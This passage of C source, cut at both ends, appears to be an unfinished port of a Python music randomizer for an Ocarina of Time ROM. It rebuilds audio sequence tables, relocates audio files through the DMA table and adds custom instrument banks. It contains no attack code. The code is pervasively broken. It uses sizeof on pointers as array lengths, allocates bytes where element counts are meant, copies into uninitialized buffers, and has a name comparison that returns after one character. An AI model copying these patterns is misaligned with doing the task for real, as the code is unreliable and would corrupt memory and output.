  Sequence_id* ids = (Sequence_id*)malloc(size);
  int ids_index = 0;
  if (bgm) {
    for (int i = 0; i < sizeof(bgm_sequence_ids) / sizeof(Sequence_id); i++) {
      ids[ids_index] = bgm_sequence_ids[i];
      ids_index++;
    }
  }
  if (fanfare) {
    for (int i = 0; i < sizeof(fanfare_sequence_ids) / sizeof(Sequence_id); i++) {
      ids[ids_index] = fanfare_sequence_ids[i];
      ids_index++;
    }
  }
  if (ocarina) {
    for (int i = 0; i < sizeof(ocarina_sequence_ids) / sizeof(Sequence_id); i++) {
      ids[ids_index] = ocarina_sequence_ids[i];
      ids_index++;
    }
  }
  if (credit) {
    for (int i = 0; i < sizeof(credit_sequence_ids) / sizeof(Sequence_id); i++) {
      ids[ids_index] = credit_sequence_ids[i];
      ids_index++;
    }
  }
  if (fileselect) {
    for (int i = 0; i < sizeof(fileselect_sequence_ids) / sizeof(Sequence_id); i++) {
      ids[ids_index] = fileselect_sequence_ids[i];
      ids_index++;
    }
  }
  return ids;
}

/********
Sound vector
********/

void sound_Vector_Init(sound_Vector* vector) {
  vector->len = 0;
  vector->size = 64;
  vector->data = (sound*)malloc(vector->size);
  if (vector->data == NULL) {
    vector->size = 0;
  }
}

bool sound_Vector_grow(sound_Vector* vector, int newSize) {
  int size_new = vector->size + newSize;
  if (vector->size == 0) {
    size_new = 64;
  }
  sound* data_new = (sound*)malloc(size_new);
  if (data_new == NULL) {
    return false;
  }
  if (vector->size > 0) {
    memcpy(data_new, vector->data, vector->size);
  }

  if (vector->data != NULL)
    free(vector->data);

  vector->data = data_new;
  vector->size = size_new;
  return true;
}

void sound_Vector_push(sound_Vector* vector, sound newSound) {
  if (!sound_Vector_grow(vector, sizeof(newSound))) {
    return;
  }

  vector->data[vector->len] = newSound;
  vector->len++;
}

sound sound_Vector_pop(sound_Vector* vector) {
  if (vector->len == 0) {
    sound empty;
    return empty;
  }

  sound val = vector->data[vector->len - 1];
  vector->len--;
  return val;
}

void sound_Vector_extend(sound_Vector* vector, const sound* new_data, int length) {
  int i = 0;
  while ((vector->len + length) >= vector->size) {
    int newSize = sizeof(new_data[i]);
    if (!sound_Vector_grow(vector, newSize)) {
      return;
    }
    i++;
  }

  memcpy(vector->data + vector->len, new_data, length);
  vector->len += length;
}

void sound_Vector_free(sound_Vector* vector) {
  if (vector->data != NULL) {
    for (int i = 0; i < vector->len; i++) {
      free(vector->data[i].file);
      free(vector->data[i].data);
    }
    free(vector->data);
    vector->data = NULL;
  }
  vector->size = 0;
  vector->len = 0;
}

/********
Bank
********/

typedef struct Bank {
  uint16_t index;
  char* meta;
  uint8_t* data;
  sound_Vector zsounds;
  int offset;
} Bank;

void Bank_Init(Bank* bank, uint16_t index, char* meta, uint8_t* data) {
  bank->index = index;
  bank->meta = meta;
  bank->data = data;
  sound_Vector sounds;
  sound_Vector_Init(&sounds);
  bank->zsounds = sounds;
  bank->offset = 0;
}

void Bank_add_zsound(Bank* bank, int tempaddr, sound zsound) {
  sound_Vector_push(&bank->zsounds, zsound);
}

uint8_t* Bank_get_entry(Bank* bank, int offset) {
  //Size: 4 (offset) + 4 (datalen) + size of meta
  uint8_t* entry = (uint8_t*)malloc(8 + sizeof(bank->meta));
  int datalen = sizeof(bank->data) / 8;
  for (int i = 0; i < sizeof(entry); i++) {
    //First 4 bytes
    if (i < 4) {
      entry[i] = (offset >> ((3 - i) * 8)) & 0xFF;
    }
    //Second 4 bytes
    else if (i < 8) {
      entry[i] = (datalen >> ((3 - (i - 4)) * 8)) & 0xFF;
    }
    //Rest of the bytes
    else {
      entry[i] = bank->meta[i - 8];
    }
  }
  return entry;
}

void Bank_update_zsound_pointers(Bank* bank) {
  for (int vectorIndex = 0; vectorIndex < bank->zsounds.len; vectorIndex++) {
    int datalen = sizeof(bank->data) / 8;
    char addressBytes[4];
    addressBytes[0] = 0;
    addressBytes[1] = 0;
    for (int i = 0; i < 2; i++) {
      addressBytes[2 + i] = (bank->zsounds.data[vectorIndex].temp_addr >> ((1 - i) * 8)) & 0xFF;
    }
    //Loop through data and see if we find any matches for the address
    for (int dataIndex = 0; dataIndex < (datalen - 3); dataIndex++) {
      bool match = true;
      for (int i = 0; i < 4; i++) {
        if (!(bank->data[dataIndex + i] == addressBytes[i])) {
          match = false;
          break;
        }
      }
      //If we find a match, replace the bytes
      if (match) {
        for (int i = 0; i < 4; i++) {
          bank->data[dataIndex + i] = (bank->zsounds.data[vectorIndex].offset >> ((3 - i) * 8)) & 0xFF;
        }
      }
    }
  }
}

/********
Bank vector
********/

typedef struct Bank_Vector {
  Bank* data;
  int len;
  int size;
} Bank_Vector;

void Bank_Vector_Init(Bank_Vector* vector) {
  vector->len = 0;
  vector->size = 64;
  vector->data = (Bank*)malloc(vector->size);
  if (vector->data == NULL) {
    vector->size = 0;
  }
}

bool Bank_Vector_grow(Bank_Vector* vector, int newSize) {
  int size_new = vector->size + newSize;
  if (vector->size == 0) {
    size_new = 64;
  }
  Bank* data_new = (Bank*)malloc(size_new);
  if (data_new == NULL) {
    return false;
  }
  if (vector->size > 0) {
    memcpy(data_new, vector->data, vector->size);
  }

  if (vector->data != NULL)
    free(vector->data);

  vector->data = data_new;
  vector->size = size_new;
  return true;
}

void Bank_Vector_push(Bank_Vector* vector, Bank newBank) {
  if (!Bank_Vector_grow(vector, sizeof(newBank))) {
    return;
  }

  vector->data[vector->len] = newBank;
  vector->len++;
}

Bank Bank_Vector_pop(Bank_Vector* vector) {
  if (vector->len == 0) {
    Bank empty;
    return empty;
  }

  Bank val = vector->data[vector->len - 1];
  vector->len--;
  return val;
}

void Bank_Vector_extend(Bank_Vector* vector, const Bank* new_data, int length) {
  int i = 0;
  while ((vector->len + length) >= vector->size) {
    int newSize = sizeof(new_data[i]);
    if (!Bank_Vector_grow(vector, newSize)) {
      return;
    }
    i++;
  }

  memcpy(vector->data + vector->len, new_data, length);
  vector->len += length;
}

void Bank_Vector_free(Bank_Vector* vector) {
  if (vector->data != NULL) {
    for (int i = 0; i < vector->len; i++) {
      free(vector->data[i].data);
      free(vector->data[i].meta);
      sound_Vector_free(&vector->data[i].zsounds);
    }
    free(vector->data);
    vector->data = NULL;
  }
  vector->size = 0;
  vector->len = 0;
}

/********
Sequence
********/

void Sequence_Init(Sequence* sequence, char* name, char* cosmetic_name, int type, int instrument_set, char* instrument_set_str,
  int replaces, int vanilla_id, uint8_t* seq_file, bool new_instrument_set /*, Vector zsounds*/) {
  //Required params
  sequence->name = name;
  sequence->seq_file = seq_file;
  sequence->cosmetic_name = cosmetic_name;
  //Optional params
  sequence->type = type;
  if (sequence->type == 0) {
    sequence->type = 0x0202;
  }
  sequence->instrument_set = instrument_set;
  if (sequence->instrument_set == 0) {
    sequence->instrument_set = 0x03;
  }
  sequence->replaces = replaces;
  if (sequence->replaces == 0) {
    sequence->replaces = -1;
  }
  sequence->vanilla_id = vanilla_id;
  if (sequence->vanilla_id == 0) {
    sequence->vanilla_id = -1;
  }
  sequence->seq_file = seq_file; //Okay to just leave as null
  sequence->new_instrument_set = new_instrument_set;
  // sequence->zsounds = zsounds;
  // if (sequence->zsounds == NULL) {
  //   Vector sounds;
  //   bank->zsounds = Vector_Init(sounds);
  // }
  //Init as null
  sequence->zbank_file = NULL;
  sequence->bankmeta = NULL;
  //If we were passed a string instrument set, then we need to parse the instrument set from the string version
  if (instrument_set_str != NULL) {
    if (instrument_set_str[0] == '-') {
      sequence->new_instrument_set = true;
    } else {
      sequence->instrument_set = atoi(instrument_set_str);
    }
  }
}

void Sequence_copy(Sequence* copy, Sequence* original) {
  Sequence_Init(copy, original->name, original->cosmetic_name, original->type, original->instrument_set, NULL,
    original->replaces, original->vanilla_id, original->seq_file, original->new_instrument_set);
  copy->zbank_file = original->zbank_file;
  copy->bankmeta = original->bankmeta;
}

Sequence* get_replacement_sequence(Sequence* sequences, int id) {
  for (int i = 0; i < sizeof(sequences) / sizeof(Sequence); i++) {
    if (sequences[i].replaces == id) {
      return &sequences[i];
    }
  }
  return NULL;
}

/********
SequenceData
********/

typedef struct SequenceData {
  int address;
  int size;
  uint8_t* data;
} SequenceData;

void SequenceData_Init(SequenceData* sequence_data) {
  sequence_data->address = -1;
  sequence_data->size = -1;
}

/********
Rom
********/

#define RANDO_CONTEXT 0x03480000
#define COSMETICS_CONTEXT_ADDR (RANDO_CONTEXT + 0x4)
#define CFG_AUDIOBANK_TABLE_EXTENDED_ADDR_VERSION 0x1F073FDD
#define CFG_AUDIOBANK_TABLE_EXTENDED_ADDR_OFFSET 0x64

#define DMA_START 0x00007430
#define DMA_SIZE 0x10

#define AUDIOBANK_DMADATA_INDEX 3
#define AUDIOSEQ_DMADATA_INDEX 4
#define AUDIOTABLE_DMADATA_INDEX 5
#define file_start AUDIOBANK_DMADATA_INDEX
#define file_end AUDIOTABLE_DMADATA_INDEX

typedef struct DMAEntry {
  int index;
  int start;
  int end;
  int size;
} DMAEntry;

typedef struct Rom {
  uint8_t* original;
  DMAEntry* dma_original;
  uint8_t* modified;
  DMAEntry* dma;
  int dma_start;
} Rom;

//The python function has size as optional, but for our purposes size will always be provided
int Rom_dma_freespace(Rom* rom, int size) {
  //Get the free space and sizes of all files
  int free_space_sizes[file_end - file_start + 1];
  int free_space_starts[file_end - file_start + 1];
  for (int i = file_start; i <= file_end; i++) {
    int end_current = ((rom->dma[i].end + 0x0F) >> 4) << 4;
    //If it's not the last entry, do bit stuff, othersize just get the length of the rom
    int start_next = i < AUDIOTABLE_DMADATA_INDEX ? ((rom->dma[i + 1].start + 0x0F) >> 4) << 4 : sizeof(rom->modified);
    if (end_current < start_next) {
      free_space_sizes[i - file_start] = start_next - end_current;
      free_space_starts[i - file_start] = end_current;
    }
  }
  //Find the smallest free space that fits the size requirement
  int chosen_index = -1;
  int smallest_size = 2147483647;
  int largest_size = 0; //For error printing
  for (int i = 0; i < (file_end - file_start + 1); i++) {
    int free_size = free_space_sizes[i];
    if (free_size >= size && free_size < smallest_size) {
      chosen_index = i;
      smallest_size = free_size;
    }
    if (free_size > largest_size) {
      largest_size = free_size;
    }
  }
  //No appropriate size found, throw error
  if (chosen_index == -1) {
    printf(""[C]Error: Not enough free space in ROM to file a file of size %i. Largest region of free space available: %i.\n"", size, largest_size);
    return -1;
  } else {
    return free_space_starts[chosen_index];
  }
}

bool Rom_dma_changed(Rom* rom, int entry) {
  DMAEntry changed = rom->dma[entry];
  DMAEntry original = rom->dma_original[entry];
  return changed.index != original.index || changed.start != original.start || changed.end != original.end || changed.size != original.size;
}

void Rom_dma_update(Rom* rom, int entry, int start, int end, int from_file) {
  //Set from_file if not provided
  if (from_file == 0) {
    //Check if this dma entry has been changed
    if (Rom_dma_changed(rom, entry)) {
      from_file = rom->dma[rom->dma[entry].index].start;
    } else {
      from_file = rom->dma[entry].start;
    }
  }
  int dma_location = rom->dma_start + rom->dma[entry].index * 0x10;
  for (int i = 0; i < 16; i++) {
    //First 4 bytes: start
    if (i < 4) {
      rom->modified[dma_location + i] = (start >> (24 - ((3 - i) * 8))) & 0xFF;
    }
    //Second 4 bytes: end
    else if (i < 8) {
      rom->modified[dma_location + i] = (end >> (24 - ((3 - (i - 4)) * 8))) & 0xFF;
    }
    //Third 4 bytes: start again
    else if (i < 12) {
      rom->modified[dma_location + i] = (start >> (24 - ((3 - (i - 8)) * 8))) & 0xFF;
    }
    //Last 4 bytes: 0
    else {
      rom->modified[dma_location + i] = 0;
    }
  }
  rom->dma[entry].start = from_file;
  rom->dma[entry].end = start;
  rom->dma[entry].size = end - start;
}

uint16_t Rom_readint16(Rom* rom, int address, bool original) {
  uint16_t result = 0;
  for (int i = 0; i < 2; i++) {
    if (original) {
      result |= (rom->original[address + i] << ((1 - i) * 8));
    } else {
      result |= (rom->modified[address + i] << ((1 - i) * 8));
    }
  }
  return result;
}

void Rom_writeint16(Rom* rom, int address, uint16_t value) {
  for (int i = 0; i < 2; i++) {
    rom->modified[address + i] = (value >> (1 - i) * 8) & 0xFF;
  }
}

int Rom_readint32(Rom* rom, int address, bool original) {
  int result = 0;
  for (int i = 0; i < 4; i++) {
    if (original) {
      result |= (rom->original[address + i] << ((3 - i) * 8));
    } else {
      result |= (rom->modified[address + i] << ((3 - i) * 8));
    }
  }
  return result;
}

void Rom_writeint32(Rom* rom, int address, int value) {
  for (int i = 0; i < 4; i++) {
    rom->modified[address + i] = (value >> (3 - i) * 8) & 0xFF;
  }
}

/********
Functions
********/

// typedef struct Group {
//   char* name;
// } Group;

// typedef struct Groups {
//   char* name;
//   Group* groups;
// } Groups;

//Returns true if the specified sequence name is in the list of disabled sequences
bool disabled_sequence(char* name, Sequence* disabled_sequences) {
  for (int disabledIndex = 0; disabledIndex < sizeof(disabled_sequences) / sizeof(Sequence); disabledIndex++) {
    char* disabled_name = disabled_sequences[disabledIndex].name;
    if (sizeof(name) == sizeof(disabled_name)) {
      for (int i = 0; i < sizeof(name); i++) {
        if (name[i] != disabled_name[i]) {
          break;
        }
        return true;
      }
    }
  }
  return false;
}

//This function is mainly file handling, not sure what this'll look like with how data will be passed
//For now, I will write the part of this function that deals with the ROM and leave out the parts that deal with files
void process_sequences(Rom rom, Sequence_id* ids, Sequence* disabled_source_sequences, Sequence* disabled_target_sequences,
  bool include_custom, Sequence* sequences, Sequence* target_sequences, Sequence_id* vanilla_ids) {
  //Initialize sizes for sequences
  sequences = (Sequence*)malloc((sizeof(ids) / sizeof(Sequence_id)) * sizeof(Sequence));
  target_sequences = (Sequence*)malloc((sizeof(ids) / sizeof(Sequence_id)) * sizeof(Sequence));
  for (int idIndex = 0; idIndex < sizeof(ids) / sizeof(Sequence_id); idIndex++) {
    //Initialize sequence data
    Sequence_id bgm = ids[idIndex];
    char* name = (char*)malloc(sizeof(bgm.title));
    name = bgm.title;
    char* cosmetic_name = (char*)malloc(sizeof(bgm.title));
    cosmetic_name = bgm.title;
    int id = bgm.id;
    //Get the 2-byte type from rom
    uint16_t type = Rom_readint16(&rom, 0xB89AE8 + (id * 0x10), false);
    uint8_t instrument_set = rom.modified[0xB89911 + 0xDD + (id * 2)];
    Sequence seq;
    Sequence_Init(&seq, name, cosmetic_name, type, instrument_set, NULL, 0, id, NULL, NULL);
    Sequence target;
    Sequence_Init(&target, name, cosmetic_name, type, instrument_set, NULL, id, 0, NULL, NULL);

    //Write the sequences into the array
    if (seq.vanilla_id != 0x57 && !disabled_sequence(cosmetic_name, disabled_source_sequences)) {
      sequences[idIndex] = seq;
    }
    if (!disabled_sequence(cosmetic_name, disabled_target_sequences)) {
      target_sequences[idIndex] = target;
    }
  }
}

// typedef struct Mapping {
//   char* key;
//   char* value;
// } Mapping;

// typedef struct Symbol {
//   char* symbol;
//   int value;
// } Symbol;

// int find_symbol(Symbol* symbols, char* searchSymbol) {
//   int value = -1;
//   for (int i = 0; i < sizeof(symbols) / sizeof(Symbol); i++) {
//     bool match = true;
//     for (int j = 0; j < sizeof(symbols[i].symbol); j++) {
//       if (symbols[i].symbol[j] != searchSymbol[j]) {
//         match = false;
//         break;
//       }
//     }
//     if (match) {
//       value = symbols[i].value;
//       break;
//     }
//   }
//   return value;
// }

//First line of this one checks the rom.dma property, need to figure out how to do that
void rebuild_sequences(Rom rom, Sequence* sequences, int CFG_AUDIOBANK_TABLE_EXTENDED_ADDR) {

  bool CUSTOM_BANKS_SUPPORTED = CFG_AUDIOBANK_TABLE_EXTENDED_ADDR != -1;

  int audioseq_start = rom.dma[AUDIOSEQ_DMADATA_INDEX].start;
  int audioseq_end = rom.dma[AUDIOSEQ_DMADATA_INDEX].end;
  int audioseq_size = rom.dma[AUDIOSEQ_DMADATA_INDEX].size;

  SequenceData* old_sequences = (SequenceData*)malloc(0x6E * sizeof(SequenceData));
  for (int i = 0; i < 0x6E; i++) {
    //Set up SequenceData object
    SequenceData entry;
    SequenceData_Init(&entry);
    int entry_address = 0xB89AE0 + (i * 0x10);
    entry.address = Rom_readint32(&rom, entry_address, false);
    entry.size = Rom_readint32(&rom, entry_address + 4, false);

    //If size > 0, read the sequence data from the rom into the sequence object
    if (entry.size > 0) {
      entry.data = (uint8_t*)malloc(entry.size);
      for (int j = 0; j < entry.size; j++) {
        entry.data[j] = rom.modified[entry.address + audioseq_start + j];
      }
    } else {
      Sequence* seq = get_replacement_sequence(sequences, i);
      if (seq != NULL && (0 < entry.address && entry.address < 128)) {
        if (seq->replaces != 0x28) {
          seq->replaces = entry.address;
        } else {
          entry.size = old_sequences[0x57].size;
          memcpy(entry.data, old_sequences[0x57].data, entry.size);
        }
      }
    }

    //Add to old sequence list
    old_sequences[i] = entry;
  }

  SequenceData* new_sequences = (SequenceData*)malloc(0x6E * sizeof(SequenceData));
  int address = 0;
  for (int i = 0; i < 0x6E; i++) {
    //Set up SequenceData object
    SequenceData new_entry;
    SequenceData_Init(&new_entry);
    SequenceData old_sequence = old_sequences[i];
    if (old_sequence.size == 0) {
      new_entry.address = old_sequence.address;
    } else {
      new_entry.address = address;
    }

    //If size > 0, read the sequence data from the rom into the sequence object
    Sequence* seq = get_replacement_sequence(sequences, i);
    if (seq != NULL) {
      //Vanilla sequence: Get data from old sequences
      if (seq->vanilla_id != -1) {
        new_entry.size = old_sequences[seq->vanilla_id].size;
        memcpy(new_entry.data, old_sequences[seq->vanilla_id].data, new_entry.size);
      } else {
        //In the Python code, this is where the custom sequence data is read from the file
        //I think we are assuming here that the custom data has already been read into the sequence list, however
        //So where in the python code seq_file is the name of the file, here I'm using it as the content of the file
        new_entry.size = sizeof(seq->seq_file);
        memcpy(new_entry.data, seq->seq_file, new_entry.size);
      }
    } else {
      new_entry.size = old_sequence.size;
      memcpy(new_entry.data, old_sequence.data, new_entry.size);
    }

    //Concatenate the full audio sequence and the new sequence data
    if (new_entry.size > 0 && sizeof(new_entry.data) > 0) {
      //Align sequences to 0x10
      if (new_entry.size % 0x10 != 0) {
        //Extend size of data
        int difference = 0x10 - (new_entry.size % 0x10);
        new_entry.data = (uint8_t*)realloc(new_entry.data, new_entry.size + difference);
        //Pad out with 0s
        for (int j = new_entry.size; j < new_entry.size + difference; j++) {
          new_entry.data[j] = 0;
        }
        new_entry.size += difference;
      }
      //Increment the current address by the size of the new sequence
      address += new_entry.size;
    }

    //Add to new sequence list
    //In the original code this is before the previous stanza, but I think with Python ""pointers"", this is meant to store the version of the entry with the padded size?
    new_sequences[i] = new_entry;
  }

  //Combine the data into a big sequence
  //Address has been keeping track of the necessary size for us
  uint8_t* new_audio_sequence = (uint8_t*)malloc(address);
  address = 0;
  for (int i = 0; i < 0x6E; i++) {
    SequenceData entry = new_sequences[i];
    for (int j = 0; j < entry.size; j++) {
      new_audio_sequence[address] = entry.data[j];
      address++;
    }
  }

  //Find a value for the new address
  int new_address = audioseq_start;
  //Adjust the DMA table if necessary
  if (address > audioseq_size) {
    //Zero out the old audio sequence
    for (int i = audioseq_start; i < audioseq_end; i++) {
      rom.modified[i] = 0;
    }
    //Find free space and update dmatable
    new_address = Rom_dma_freespace(&rom, address);
    Rom_dma_update(&rom, AUDIOSEQ_DMADATA_INDEX, new_address, new_address + address, 0);
  }

  //Write new audio sequence file
  for (int i = 0; i < address; i++) {
    rom.modified[new_address + i] = new_audio_sequence[i];
  }

  int fanfare_bank_shift = CUSTOM_BANKS_SUPPORTED ? 0x26 : 0;

  //Update pointer table
  for (int i = 0; i < 0x6E; i++) {
    Rom_writeint32(&rom, 0xB89AE0 + (i * 0x10), new_sequences[i].address);
    Rom_writeint32(&rom, 0xB89AE0 + (i * 0x10) + 4, new_sequences[i].size);
    Sequence* seq = get_replacement_sequence(sequences, i);
  }

  //Update instrument sets
  Sequence_id* sequence_ids = get_sequence_ids(true, true, true, true, true);
  for (int i = 0; i < sizeof(sequence_ids) / sizeof(Sequence_id); i++) {
    Sequence_id seqId = sequence_ids[i];
    //Get the replacement sequeunce
    int id = seqId.id;
    if (new_sequences[id].size == 0) {
      id = new_sequences[id].address;
    }
    Sequence* seq = get_replacement_sequence(sequences, id);
    //If one was found, then write the new instrument set
    if (seq != NULL) {
      int set = seq->instrument_set;
      if (strncmp(seqId.type, ""fanfare"", 7) == 0 || strncmp(seqId.type, ""ocarina"", 7) == 0) {
        set += fanfare_bank_shift;
      }
      rom.modified[0xB89911 + 0xDD + (seqId.id * 2)] = set;
    }
  }

  //Patch new instrument sets (banks) and add new instrument sounds
  //Only if we were passed CFG_AUDIOBANK_TABLE_EXTENDED_ADDR via symbols which means we're on the right version.
  if (!CUSTOM_BANKS_SUPPORTED) {
    return;
  }

  //Builds new audio bank entrys for fanfares to prevent fanfares killing bgm in areas like Goron City
  int bank_index_base = Rom_readint32(&rom, CFG_AUDIOBANK_TABLE_EXTENDED_ADDR, false) - 0x80400000 + 0x03480000;
  //Build new fanfare banks by copying each entry in audiobank_index
  for (int i = 0; i < 0x26; i++) {
    uint8_t bank_entry[10];
    for (int j = 0; j < 10; j++) {
      bank_entry[j] = rom.modified[bank_index_base + 0x10 + 0x10 * i + j]; //Get the vanilla entry
    }
    bank_entry[9] = 1; //Update the cache type to 1
    for (int j = 0; j < 10; j++) {
      rom.modified[bank_index_base + 0x270 + 0x10 * i + j] = bank_entry[j]; //Write the new entry at the end of the bank table.
    }
  }
  rom.modified[bank_index_base + 0x01] = 0x4C; //Updates AudioBank Index Header if no custom banks are present as this would be 0x26 which would crash the game if a fanfare was played

  Bank_Vector added_banks;
  Bank_Vector_Init(&added_banks);
  sound_Vector added_instruments;
  sound_Vector_Init(&added_instruments);
  uint8_t* instr_data = (uint8_t*)malloc(0);

  uint16_t new_bank_index = 0x4C;
  int audiobank_start = rom.dma[AUDIOBANK_DMADATA_INDEX].start;
  int audiobank_size = rom.dma[AUDIOBANK_DMADATA_INDEX].size;
  int audiotable_start = rom.dma[AUDIOTABLE_DMADATA_INDEX].start;
  int audiotable_size = rom.dma[AUDIOTABLE_DMADATA_INDEX].size;
  int instr_offset_in_file = audiobank_size;
  int bank_table_base = 0;

  //Process each sequence
  for (int sequenceIndex = 0; sequenceIndex < 0x6E; sequenceIndex++) {
    int bank_table_base = Rom_readint32(&rom, CFG_AUDIOBANK_TABLE_EXTENDED_ADDR, false) - 0x80400000 + 0x3480000;
    int replacement_id = sequenceIndex;
    if (new_sequences[sequenceIndex].size <= 0) {
      replacement_id = new_sequences[sequenceIndex].address;
    }
    Sequence* seq = get_replacement_sequence(sequences, replacement_id);
    if (seq != NULL && seq->new_instrument_set) {
      //See if this bank has already been added
      bool alreadyAdded = false;
      uint16_t seq_bank_index = -1;
      for (int bankIndex = 0; bankIndex < added_banks.len; bankIndex++) {
        bool match = true;
        //Check if the data is found in the added banks list already
        if (sizeof(added_banks.data[bankIndex].data) == sizeof(seq->zbank_file)) {
          for (int i = 0; i < sizeof(seq->zbank_file); i++) {
            if (added_banks.data[bankIndex].data[i] != seq->zbank_file[i]) {
              match = false;
              break;
            }
          }
        } else {
          match = false;
        }
        if (match) {
          alreadyAdded = true;
          seq_bank_index = added_banks.data[bankIndex].index;
          break;
        }
      }
      if (!alreadyAdded) {
        Bank bank;
        Bank_Init(&bank, new_bank_index, seq->bankmeta, seq->zbank_file);
        //Handle any new instruments
        for (int zsoundIndex = 0; zsoundIndex < seq->zsounds.size; zsoundIndex++) {
          sound zsound = seq->zsounds.data[zsoundIndex];
          uint16_t tempaddr = zsound.temp_addr;
          uint8_t* curr_instrument_data = zsound.data;
          //See if this instrument has already been added
          int addedInstrIndex = -1;
          for (int instrIndex = 0; instrIndex < added_instruments.len; instrIndex++) {
            bool match = true;
            //Check if the data is found in the added banks list already
            if (sizeof(added_instruments.data[instrIndex].data) == sizeof(zsound.data)) {
              for (int i = 0; i < sizeof(zsound.data); i++) {
                if (added_instruments.data[instrIndex].data[i] != zsound.data[i]) {
                  match = false;
                  break;
                }
              }
            } else {
              match = false;
            }
            if (match) {
              addedInstrIndex = instrIndex;
              break;
            }
          }
          //Already added this instrument. Just add it to the bank
          if (addedInstrIndex != -1) {
            Bank_add_zsound(&bank, tempaddr, zsound);
          } else {
            //Add current to the total instrument data and pad out to 0x10
            int prevSize = sizeof(instr_data);
            int nextSize = prevSize + sizeof(curr_instrument_data);
            int padDifference = nextSize % 10 == 0 ? 0 : 0x10 - (nextSize % 0x10);
            instr_data = (uint8_t*)realloc(instr_data, nextSize + padDifference);
            for (int i = 0; i < sizeof(curr_instrument_data) + padDifference; i++) {
              if (i < sizeof(curr_instrument_data)) {
                instr_data[prevSize + i] = curr_instrument_data[i];
              } else { //Pad out the rest with 0s
                instr_data[prevSize + i] = 0;
              }
            }
            zsound.size = sizeof(curr_instrument_data) + padDifference;
            zsound.offset = instr_offset_in_file;
            instr_offset_in_file += zsound.size;
            Bank_add_zsound(&bank, tempaddr, zsound);
            sound_Vector_push(&added_instruments, zsound);
          }
        }
        seq_bank_index = bank.index;
        Bank_Vector_push(&added_banks, bank);
        new_bank_index++;
      }
      //Write a single byte for the bank index, although it is a 2 byte value elsewhere
      rom.modified[0xB89911 + 0xDD + (sequenceIndex * 2)] = seq_bank_index & 0xFF;
    }
  }

  //Patch the new instrument data into the ROM in a new file.
  //If there is any instrument data to add, move the entire audiotable file to a new location in the ROM.
  if (sizeof(instr_data) > 0) {
    //Read in original audiotable data and zero out existing file
    uint8_t* audiotable_data = (uint8_t*)malloc(audiotable_size + sizeof(instr_data));
    for (int i = 0; i < audiobank_size; i++) {
      audiotable_data[i] = rom.modified[audiotable_start + i];
      rom.modified[audiotable_start + i] = 0;
    }
    //Add the new data
    for (int i = 0; i < sizeof(instr_data); i++) {
      audiotable_data[audiotable_size + i] = instr_data[i];
    }
    //Get new address for the file
    int new_audiotable_start = Rom_dma_freespace(&rom, sizeof(audiotable_data));
    //Write the file to the new address
    for (int i = 0; i < sizeof(audiotable_data); i++) {
      rom.modified[new_audiotable_start + i] = audiotable_data[i];
    }
    //Update DMA
    Rom_dma_update(&rom, AUDIOTABLE_DMADATA_INDEX, new_audiotable_start, new_audiotable_start + sizeof(audiotable_data), 0);
  }

  //Add new audio banks
  uint8_t* new_bank_data = (uint8_t*)malloc(0);
  //Read the original audiobank data
  uint8_t* audiobank_data = (uint8_t*)malloc(audiobank_size);
  for (int i = 0; i < audiobank_size; i++) {
    audiobank_data[i] = rom.modified[audiobank_start + i];
  }
  int new_bank_offset = audiobank_size;
  for (int bankIndex = 0; bankIndex < added_banks.len; bankIndex++) {
    //Write bank data to rom
    Bank bank = added_banks.data[bankIndex];
    Bank_update_zsound_pointers(&bank);
    bank.offset = new_bank_offset;
    uint8_t* bank_entry = Bank_get_entry(&bank, new_bank_offset);
    for (int i = 0; i < sizeof(bank_entry); i++) {
      rom.modified[bank_table_base + 0x10 + bank.index * 0x10 + i] = bank_entry[i];
    }
    //Add to total new bank data
    int prevSize = sizeof(new_bank_data);
    int nextSize = prevSize + sizeof(bank_entry);
    new_bank_data = (uint8_t*)realloc(new_bank_data, nextSize);
    for (int i = 0; i < sizeof(bank_entry); i++) {
      new_bank_data[prevSize + i] = bank_entry[i];
    }
    new_bank_offset += nextSize;
  }

  //If there is any audiobank data to add, move the entire audiobank file to a new place in ROM. Update the existing dmadata record
  if (sizeof(new_bank_data) > 0) {
    //Zero out existing file
    for (int i = 0; i < audiobank_size; i++) {
      rom.modified[audiobank_start + i] = 0;
    }
    //Add the new data
    int prevSize = sizeof(audiobank_data);
    int nextSize = prevSize + sizeof(new_bank_data);
    audiobank_data = (uint8_t*)realloc(audiobank_data, nextSize);
    for (int i = 0; i < sizeof(new_bank_data); i++) {
      audiobank_data[prevSize + i] = new_bank_data[i];
    }
    //Get new address for the file
    int new_audio_banks_addr = Rom_dma_freespace(&rom, nextSize);
    //Write the file to the new address
    for (int i = 0; i < nextSize; i++) {
      rom.modified[new_audio_banks_addr + i] = audiobank_data[i];
    }
    //Update DMA
    Rom_dma_update(&rom, AUDIOBANK_DMADATA_INDEX, new_audio_banks_addr, new_audio_banks_addr + nextSize, 0);
    //Update size of bank table in the Audiobank table header
    Rom_writeint16(&rom, bank_table_base, new_bank_index);
  }

  //Update the init heap size. This size is normally hardcoded based on the number of audio banks.
  int init_heap_size = Rom_readint32(&rom, 0xB80118, false);
  init_heap_size += (new_bank_index - 0x26) * 0x20;
  Rom_writeint32(&rom, 0xB80118, init_heap_size);
}

void rebuild_pointers_table(Rom rom, Sequence* sequences) {
  for (int sequenceIndex = 0; sequenceIndex < sizeof(sequences) / sizeof(Sequence); sequenceIndex++) {
    Sequence sequence = sequences[sequenceIndex];
    //Get the original values
    uint8_t bgm_sequence[0x10];
    for (int i = 0; i < 0x10; i++) {
      bgm_sequence[i] = rom.original[0xB89AE0 + (sequence.vanilla_id * 0x10) + i];
    }
    uint8_t instr_1 = rom.original[0xB89910 + 0xDD + (sequence.vanilla_id * 2)];
    uint8_t instr_2 = rom.original[0xB89910 + 0xDD + (sequence.vanilla_id * 2) + 1];
    //Replace the values at the addresses we want
    for (int i = 0; i < 0x10; i++) {
      rom.modified[0xB89AE0 + (sequence.replaces * 0x10) + i] = bgm_sequence[i];
    }
    rom.modified[0xB89910 + 0xDD + (sequence.replaces * 2)] = instr_1;
    rom.modified[0xB89910 + 0xDD + (sequence.replaces * 2) + 1] = instr_2;
  }
  //Special handling for fairy fountain file select music
  uint8_t fairy_1 = rom.modified[0xB89910 + 0xDD + (0x28 * 2)]; //Based on the python code looks like this reads from the modified rather than the original
  uint8_t fairy_2 = rom.modified[0xB89910 + 0xDD + (0x28 * 2) + 1];
  rom.modified[0xB89910 + 0xDD + (0x57 * 2)] = fairy_1;
  rom.modified[0xB89910 + 0xDD + (0x57 * 2) + 1] = fairy_2;
}

void disable_music(Rom rom, int* ids) {
  uint8_t blank_track[0x10];
  //First track is blank, extract from rom
  for (int i = 0; i < 0x10; i++) {
